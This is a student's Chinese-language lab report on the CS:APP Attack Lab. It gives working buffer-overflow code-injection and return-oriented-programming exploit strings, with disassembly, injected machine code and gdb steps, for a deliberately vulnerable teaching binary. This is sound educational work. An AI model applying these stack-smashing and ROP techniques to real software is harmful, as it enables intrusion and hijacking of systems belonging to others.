
# Attack Lab实验报告

## 刘金成 2023302111097


## Part 1 CI攻击

### Phase 1

CTARGET中函数test调用了函数getbuf，test的代码如下：
```c
void  test() {
	int  val;
	val = getbuf();
	printf("No exploit.  Getbuf returned 0x%x\n", val);
}
```
我们的目的是使用缓冲区溢出攻击使得程序在执行`getbuf`后跳转到`touch1` 
```
00000000004017f1 <getbuf>:
  4017f1:       48 83 ec 38             sub    $0x38,%rsp
  4017f5:       48 89 e7                mov    %rsp,%rdi
  4017f8:       e8 2d 02 00 00          callq  401a2a <Gets>
  4017fd:       b8 01 00 00 00          mov    $0x1,%eax
  401802:       48 83 c4 38             add    $0x38,%rsp
  401806:       c3                      retq

0000000000401807 <touch1>:
  401807:       48 83 ec 08             sub    $0x8,%rsp
  40180b:       c7 05 e7 2c 20 00 01    movl   $0x1,0x202ce7(%rip)        # 6044fc <vlevel>
  401812:       00 00 00
  401815:       bf 31 2f 40 00          mov    $0x402f31,%edi
  40181a:       e8 31 f4 ff ff          callq  400c50 <puts@plt>
  40181f:       bf 01 00 00 00          mov    $0x1,%edi
  401824:       e8 f0 03 00 00          callq  401c19 <validate>
  401829:       bf 00 00 00 00          mov    $0x0,%edi
  40182e:       e8 ad f5 ff ff          callq  400de0 <exit@plt>
```

因为`getbuf`使用`get`函数读取数据，所以需要用`touch1`的地址（`0x401807`）覆盖掉它的返回地址

`getbuf`开辟的栈空间大小为56字节，先输入56个字节大小的垃圾数据再输入`touch1`的地址（小端法）
```
(a1.txt)
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
07 18 40 00
```
用`hex2raw`转成字符串（使用方法在官方教程里），运行通过
```
root@ad79a1307964:~/Desktop/target232111097# ./hex2raw < a1.txt > a1_raw.txt
root@ad79a1307964:~/Desktop/target232111097# gdb ctarget

(gdb) run < a1_raw.txt
```
### Phase 2
在ctarget文件中，函数touch2的代码如下：
```c
void touch2(unsigned val)
	vlevel = 2; /* Part of validation protocol */
	if (val == cookie) {
		printf("Touch2!: You called touch2(0x%.8x)\n", val);
		validate(2);
	} else {
		printf("Misfire: You called touch2(0x%.8x)\n", val);
		fail(2);
	}
	exit(0);
}
```
你的任务是使CTARGET执行touch2的代码而不是返回到test。在这个例子中，你必须让touch2以为它收到的参数是你的cookie。

phase 1 通过后，我们会得到 cookie为`0x6a1e7f12`（另一个文件也有）
```
Cookie: 0x6a1e7f12
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```
`touch`的参数储存在`%rdi`里，所以要做两件事，一是把cookie放到`%rdi`里，二是跳转到，三是截停getbuf运行后的转移控制，不能返回到test里，而是返回到我们注入的代码处

三容易达成，就是和 phase1 一样，利用缓冲区溢出修改getbuf后面的返回地址，跳到注入的代码处

前两个任务就是要注入的代码，那我们的代码要注入到哪里呢？
考虑getbuf把数据读取到栈里，在phase1我们读入的是垃圾数据来填满缓冲区，现在我们可以把注入的机器码放在缓冲区，然后修改返回位置到开栈的位置，这样就能接着运行我们的代码了

 ```
 0000000000401833 <touch2>:
  401833:       48 83 ec 08             sub    $0x8,%rsp
  401837:       89 fe                   mov    %edi,%esi
  （···）
 ```
 可知 touch2 在 `0x401833`
 
 所以注入的代码应该为
  ```
  （a2_code.s）
 mov $0x6a1e7f12,%rdi
pushq $0x401833
retq
  ```
  先生成机器码
  ```
  gcc -c a2_code.s
  ```
  再反汇编查看
  ```
  objdump -d a2_code.o > a2_code.txt
```
得到
```
a2_code.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 12 7f 1e 6a    mov    $0x6a1e7f12,%rdi
   7:   68 33 18 40 00          pushq  $0x401833
   c:   c3                      retq
```
 
 下面再找开栈的位置即栈的起始位置：用gdb调试看rsp存的位置，在`4017f5`即开栈后的某个语句打断点
 ```
 Breakpoint 1, getbuf () at buf.c:14
14	buf.c: No such file or directory.

(gdb) print $rsp
$1 = (void *) 0x5560fb88
 ```
 ``0x5560fb88``就是开栈的位置（同时我们也知道了开栈前的初始位置是`0x5560fbc0`，phase3用到），故注入：
 ```
 (a2.txt)
48 c7 c7 12 7f 1e 6a 68
33 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
88 fb 60 55
 ```
 下同phase1，通过

### Phase 3
第三阶段还是代码注入攻击，但是是要传递字符串作为参数。

ctarget文件中函数hexmatch和touch3的C代码如下：
```c
int hexmatch(unsigned val, char *sval){
	char cbuf[110];
	/* Make position of check string unpredictable */
	char *s = cbuf + random() % 100;
	sprintf(s, "%.8x", val);
	return strncmp(sval, s, 9) == 0;
}
void touch3(char *sval){
	vlevel = 3; /* Part of validation protocol */
	if (hexmatch(cookie, sval)) {
		printf("Touch3!: You called touch3(\"%s\")\n", sval);
		validate(3);
		} else {
		printf("Misfire: You called touch3(\"%s\")\n", sval);
		fail(3);
	}
	exit(0);
}
```
你的任务是让CTARGET执行touch3而不要返回到test。要使touch3以为你传递你的cookie的字符串表示作为它的参数。

```
(gdb) disas touch3
Dump of assembler code for function touch3:
   0x0000000000401907 <+0>:	push   %rbx
   0x0000000000401908 <+1>:	mov    %rdi,%rbx
(···)
``` 
可知touch3的起始位置是`0x401907`

 C中的字符串表示是一个字节序列，最后跟一个值为0的字节。先用man ascii 找到需要的字符的字节表示
 ```
    Tables
       For convenience, below are more compact tables in hex and decimal.
          2 3 4 5 6 7       30 40 50 60 70 80 90 100 110 120
        -------------      ---------------------------------
       0:   0 @ P ` p     0:    (  2  <  F  P  Z  d   n   x
       1: ! 1 A Q a q     1:    )  3  =  G  Q  [  e   o   y
       2: " 2 B R b r     2:    *  4  >  H  R  \  f   p   z
       3: # 3 C S c s     3: !  +  5  ?  I  S  ]  g   q   {
       4: $ 4 D T d t     4: "  ,  6  @  J  T  ^  h   r   |
       5: % 5 E U e u     5: #  -  7  A  K  U  _  i   s   }
       6: & 6 F V f v     6: $  .  8  B  L  V  `  j   t   ~
       7: ' 7 G W g w     7: %  /  9  C  M  W  a  k   u  DEL
       8: ( 8 H X h x     8: &  0  :  D  N  X  b  l   v
       9: ) 9 I Y i y     9: '  1  ;  E  O  Y  c  m   w
       A: * : J Z j z
       B: + ; K [ k {
       C: , < L \ l |
       D: - = M ] m }
       E: . > N ^ n ~
       F: / ? O _ o DEL
 ```
 故`0x6a1e7f12` 对应的序列是
 ```
 36 61 31 65 37 66 31 32 00
 ```
 
 文档里还说：调用hexmatch和strncmp函数时，会将数据压入栈中，覆盖getbuf使用的缓冲区的内存，你需要很小心把你的cookie字符串表示放在哪里。
 
 说明不能像phase2一样把cookie字符串放到getbuf的栈里面，那40个字符用来存放命令后填满即可。

考虑放到get的栈帧中，即越过56个字节的上方，因为不再返回了，那部分不会被触碰到

将cookie字符串存放在rsp初始位置+8字节的位置（随便加个偏移量就行，只要方便填充机器码），再把cookie字符串的起始地址存进%rdi

在phase2中已经得到栈顶指针%rsp的初始值为`0x5560fbc0`,故注入代码：
```
mov $0x5560fbc8,%rdi
pushq $0x401907
ret
```
下同phase2得到机器码
```
48 c7 c7 c8 fb 60 55 68
07 19 40 00 c3                    
```
用垃圾数据补充满56个字节，加上返回注入代码的地址（同phase2），加上4个字节（注入代码地址占了4个，加起来一共8个），再填充cookie
```
48 c7 c7 c8 fb 60 55 68
07 19 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 <- rsp
88 fb 60 55 00 00 00 00
36 61 31 65 37 66 31 32 00
```
通过
 
 ## Part 2 ROP攻击
 
从gadget farm中挑选出有用的gadget执行ROP攻击，函数start_farm和end_farm之间的所有函数构成了gadget farm，不要用程序代码中的其他部分作为gadget

把farm里面的代码复制进一个文本文件里方便查找我们需要的代码
 
 ### Phase 4
需要用ROP攻击实现phase2，即调用touch2函数，跳转和前面的一样，但是还需要把cookie放到`%rdi`里

首先考虑最简单的，即在farm里找到
```
pop %rdi
ret
```
找不到，考虑
```
pop %rax
ret

movq %rax,%rdi
ret
```
机器码为
```
Disassembly of section .text:

0000000000000000 <.text>:
   0:   58                      pop    %rax
   1:   c3                      retq
   2:   48 89 c7                mov    %rax,%rdi
   5:   c3                      retq 
```

pop    %rax 对应的机器码为 58，先搜58，找到
```
0000000000401995 <getval_222>:
  401995:       b8 da 58 c3 fc          mov    $0xfcc358da,%eax
  40199a:       c3                      retq
```
在`0x401997`（不唯一，随便一个就行）

 mov    %rax,%rdi 对应的机器码为 48 89 c7 ，找到
 ```
 000000000040199b <getval_435>:
  40199b:       b8 48 89 c7 c3          mov    $0xc3c78948,%eax
  4019a0:       c3                      retq
 ```
 在`0x40199c`

现在画一下栈帧，看着清楚一点
```
getbuf栈帧（填满56个）
gardget1: pop    %rax		           <-rsp
cookie: 0x6a1e7f12
gardget2: mov    %rax,%rdi
&touch2: 0x401833
```
得到对应的机器码
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
97 19 40 00 00 00 00 00
12 7f 1e 6a 00 00 00 00
9c 19 40 00 00 00 00 00
33 18 40 00 00 00 00 00
```
 通过

### Phase 5

```

movq %rsp, %rax
ret

movq %rax, %rdi
ret

popq %rax
ret

movl %eax, %edx
ret

movl %edx, %ecx
ret

movl %ecx, %esi
ret

lea    (%rdi,%rsi,1),%rax
ret

movq %rax, %rdi
ret

```
```
Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 89 e0                mov    %rsp,%rax
   3:   c3                      retq
   4:   48 89 c7                mov    %rax,%rdi
   7:   c3                      retq
   8:   58                      pop    %rax
   9:   c3                      retq
   
   a:   89 c2                   mov    %eax,%edx
   c:   c3                      retq
   d:   89 d1                   mov    %edx,%ecx
   f:   c3                      retq
  10:   89 ce                   mov    %ecx,%esi
  12:   c3                      retq
  13:   48 8d 04 37             lea    (%rdi,%rsi,1),%rax
  17:   c3                      retq
  18:   48 89 c7                mov    %rax,%rdi
  1b:   c3                      retq
```

mov    %rsp,%rax 在 0x401a09
```
0000000000401a07 <setval_235>:
  401a07:       c7 07 48 89 e0 c3       movl   $0xc3e08948,(%rdi)
  401a0d:       c3                      retq
```
mov    %rax,%rdi 在 0x40199c
```
000000000040199b <getval_435>:
  40199b:       b8 48 89 c7 c3          mov    $0xc3c78948,%eax
  4019a0:       c3                      retq
```
pop    %rax 在 0x4019c4
```
00000000004019c2 <addval_113>:
  4019c2:       8d 87 58 90 90 90       lea    -0x6f6f6fa8(%rdi),%eax
  4019c8:       c3                      retq
```
mov    %eax,%edx 在 0x4019d5
```
00000000004019d4 <getval_232>:
  4019d4:       b8 89 c2 20 c9          mov    $0xc920c289,%eax
  4019d9:       c3                      retq
```
mov    %edx,%ecx 在 0x401a4e
```
0000000000401a4c <setval_363>:
  401a4c:       c7 07 89 d1 84 d2       movl   $0xd284d189,(%rdi)
  401a52:       c3                      retq
```
mov    %ecx,%esi 在 0x401a5c
```
0000000000401a5a <setval_386>:
  401a5a:       c7 07 89 ce 18 db       movl   $0xdb18ce89,(%rdi)
  401a60:       c3                      retq
```
lea    (%rdi,%rsi,1),%rax 在 0x4019cf
```
00000000004019cf <add_xy>:
  4019cf:       48 8d 04 37             lea    (%rdi,%rsi,1),%rax
  4019d3:       c3                      retq
```
mov    %rax,%rdi  在 0x40199c
```
000000000040199b <getval_435>:
  40199b:       b8 48 89 c7 c3          mov    $0xc3c78948,%eax
  4019a0:       c3                      retq
```

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
09 1a 40 00 00 00 00 00
9c 19 40 00 00 00 00 00
c4 19 40 00 00 00 00 00
48 00 00 00 00 00 00 00
d5 19 40 00 00 00 00 00
4e 1a 40 00 00 00 00 00
5c 1a 40 00 00 00 00 00
cf 19 40 00 00 00 00 00
9c 19 40 00 00 00 00 00
07 19 40 00 00 00 00 00
36 61 31 65 37 66 31 32 00
```

